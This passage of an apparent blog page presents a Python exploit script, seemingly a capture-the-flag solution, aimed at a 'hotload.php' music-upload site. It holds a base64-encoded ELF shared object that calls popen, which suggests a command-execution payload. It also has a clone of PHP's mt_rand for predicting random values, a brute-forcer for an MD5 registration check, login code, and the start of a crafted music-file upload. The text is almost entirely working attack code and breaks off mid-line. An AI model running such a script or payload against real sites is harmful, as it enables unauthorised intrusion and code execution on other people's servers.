AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADARAAAAAAAAAAAAAAAAAADwEAAAAAAAAAEAAAAAAAAAfAAAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACsEQAAAAAAABkAAAAAAAAAAD4AAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAGACAAAAAAAABQAAAAAAAACwAwAAAAAAAAYAAAAAAAAAkAIAAAAAAAAKAAAAAAAAAJIAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAAEAAAAAAAAACAAAAAAAAAGAAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAcAUAAAAAAAAHAAAAAAAAAIAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAGAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAQgQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAA4QAAAAAAAAAAAAAAAAAAAR0NDOiAoRGViaWFuIDguMy4wLTYpIDguMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAGACAAAAAAAAAAAAAAAAAAAAAAAAAwADAJACAAAAAAAAAAAAAAAAAAAAAAAAAwAEALADAAAAAAAAAAAAAAAAAAAAAAAAAwAFAEIEAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAHAFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAAAQAAAAAAAAAAAAAAAAAAAAAAAAAwAKACAQAAAAAAAAAAAAAAAAAAAAAAAAAwALAHAQAAAAAAAAAAAAAAAAAAAAAAAAAwAMAIAQAAAAAAAAAAAAAAAAAAAAAAAAAwANAKwRAAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAgAAAAAAAAAAAAAAAAAAAAAAAAAwAPAAwhAAAAAAAAAAAAAAAAAAAAAAAAAwAQADAhAAAAAAAAAAAAAAAAAAAAAAAAAwARAAA+AAAAAAAAAAAAAAAAAAAAAAAAAwASABA+AAAAAAAAAAAAAAAAAAAAAAAAAwATABg+AAAAAAAAAAAAAAAAAAAAAAAAAwAUANg/AAAAAAAAAAAAAAAAAAAAAAAAAwAVAABAAAAAAAAAAAAAAAAAAAAAAAAAAwAWADhAAAAAAAAAAAAAAAAAAAAAAAAAAwAXAGBAAAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAIAQAAAAAAAAAAAAAAAAAAAOAAAAAgAMALAQAAAAAAAAAAAAAAAAAAAhAAAAAgAMAPAQAAAAAAAAAAAAAAAAAAA3AAAAAQAXAGBAAAAAAAAAAQAAAAAAAABGAAAAAQASABA+AAAAAAAAAAAAAAAAAABtAAAAAgAMADARAAAAAAAAAAAAAAAAAAB5AAAAAQARAAA+AAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACjAAAAAQAQAKghAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACxAAAAAgANAKwRAAAAAAAAAAAAAAAAAAC3AAAAAQAWADhAAAAAAAAAAAAAAAAAAADEAAAAAQATABg+AAAAAAAAAAAAAAAAAADNAAAAAAAPAAwhAAAAAAAAAAAAAAAAAADgAAAAAQAWAEhAAAAAAAAAAAAAAAAAAADsAAAAAQAVAABAAAAAAAAAAAAAAAAAAAACAQAAAgAJAAAQAAAAAAAAAAAAAAAAAAAIAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAkAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA3AQAAEgAMADURAAAAAAAAdgAAAAAAAAA7AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABPAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABjAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQAWAEBAAAAAAAAACAAAAAAAAAByAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACFAQAAEQAXAIBAAAAAAAAAMAEAAAAAAACOAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACoAQAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjczMjUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGZpcm13YXJlLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAZnJlYWRAQEdMSUJDXzIuMi41AGZ1bgBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AcG9wZW5AQEdMSUJDXzIuMi41AF92ZXJzaW9uAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAkAIAAAAAAACQAgAAAAAAACABAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAALADAAAAAAAAsAMAAAAAAACSAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABCBAAAAAAAAEIEAAAAAAAAGAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAYAQAAAAAAABgBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAADwAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABwBQAAAAAAAHAFAAAAAAAAYAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABwEAAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAACsBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAKwRAAAAAAAArBEAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACQEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAADCEAAAAAAAAMIQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAhAAAAAAAAMCEAAAAAAAB8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAAPgAAAAAAAAAuAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAADgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAADhAAAAAAAAAODAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABgQAAAAAAAAEgwAAAAAAAAUAEAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIMAAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAaDAAAAAAAAAoBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA1AAAAAAAAxAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABUNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">php_rand</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    MT_RAND_MT19937 = <span class="number">0</span></span><br><span class="line">    MT_RAND_PHP = <span class="number">1</span></span><br><span class="line">    php_N = <span class="number">624</span></span><br><span class="line">    php_M = <span class="number">397</span></span><br><span class="line">    php_left = <span class="number">0</span></span><br><span class="line">    php_next = <span class="number">0</span></span><br><span class="line">    php_state = [<span class="number">0</span>] * (php_N + <span class="number">1</span>)</span><br><span class="line">    php_mode = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed, mode=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line">        self.php_mode = mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">seed</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.php_mt_srand(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.php_mt_rand()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hiBit</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loBit</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x00000001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loBits</span><span class="params">(self, u)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> u &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mixBits</span><span class="params">(self, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.hiBit(u) | self.loBits(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span><span class="params">(self, m, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> m ^ (self.mixBits(u, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(v)) &amp; <span class="number">0x9908b0df</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist_php</span><span class="params">(self, m, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> m ^ (self.mixBits(u, v) &gt;&gt; <span class="number">1</span>) ^ ((-self.loBit(u)) &amp; <span class="number">0x9908b0df</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        N = self.php_N</span><br><span class="line">        state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">            state[i] = (<span class="number">1812433253</span> * (state[i - <span class="number">1</span>] ^ (state[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.php_left = <span class="number">0</span></span><br><span class="line">        state = self.php_state</span><br><span class="line">        N = self.php_N</span><br><span class="line">        M = self.php_M</span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        i = N - M</span><br><span class="line">        <span class="keyword">if</span> self.php_mode == self.MT_RAND_MT19937:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[p] = self.twist(state[p + M],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[p] = self.twist(state[p+M-N],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[p] = self.twist(state[p + M - N],state[p + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">                state[p] = self.twist_php(state[p + M],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">            i = M - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">                state[p] = self.twist_php(state[p + M - N],state[p + <span class="number">0</span>],state[p + <span class="number">1</span>])</span><br><span class="line">                p += <span class="number">1</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">            state[p] = self.twist_php(state[p + M - N],state[p + <span class="number">0</span>],state[<span class="number">0</span>])</span><br><span class="line">        self.php_left = N</span><br><span class="line">        self.php_next = <span class="number">0</span></span><br><span class="line">        self.php_state = state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_srand</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.php_mt_initialize(seed)</span><br><span class="line">        self.php_mt_reload()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.php_left == <span class="number">0</span>: self.php_mt_reload()</span><br><span class="line">        self.php_left -= <span class="number">1</span></span><br><span class="line">        s1 = self.php_state[self.php_next]</span><br><span class="line">        s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">        s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">        self.php_next += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ( s1 ^ (s1 &gt;&gt; <span class="number">18</span>)) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get random string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_str</span><span class="params">(length=<span class="number">8</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get method</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(session, url)</span>:</span></span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                r = s.get(url, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = requests.get(url, timeout=timeout)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_count:</span><br><span class="line">                print(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># post method</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(session, url, data, files=<span class="string">''</span>)</span>:</span></span><br><span class="line">    retry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        retry += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> session:</span><br><span class="line">                <span class="keyword">if</span> files==<span class="string">''</span>:</span><br><span class="line">                    r = s.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = s.post(url, data=data, files=files, timeout=timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> files==<span class="string">''</span>:</span><br><span class="line">                    r = requests.post(url, data=data, timeout=timeout)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = requests.post(url, data=data, files=files, timeout=timeout)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> retry &gt;= retry_count:</span><br><span class="line">                print(<span class="string">'timeout or http 500'</span>)</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login with username and password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=login'</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    res = get(<span class="number">1</span>, url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'fileuploaded'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># reg with username and password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=reg'</span></span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    res = get(<span class="number">1</span>, url)</span><br><span class="line">    show_code = <span class="string">''</span></span><br><span class="line">    show_calc = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        show_code = res.text.split(<span class="string">'show_code"&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        show_calc = res.text.split(<span class="string">'show_calc"&gt;'</span>)[<span class="number">1</span>].split(<span class="string">'&lt;'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> logging: print(len(show_calc))</span><br><span class="line">        <span class="keyword">if</span> len(show_calc) != <span class="number">6</span>:</span><br><span class="line">            print(<span class="string">'invalid show_calc length'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"show_code"</span>,show_code)</span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"show_calc"</span>,show_calc)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100000000</span>):</span><br><span class="line">        code = str(i)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(code + show_code).hexdigest()[:<span class="number">6</span>] == show_calc.lower(): <span class="keyword">break</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password1'</span>: password, <span class="string">'password2'</span>: password, <span class="string">'code'</span>: code&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload music [diff]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_music</span><span class="params">()</span>:</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=upload'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    music = preset_music[:<span class="number">0x6</span>] + <span class="string">'\x00\x00\x03\x00'</span> + preset_music[<span class="number">0x0a</span>:<span class="number">0x53</span>]</span><br><span 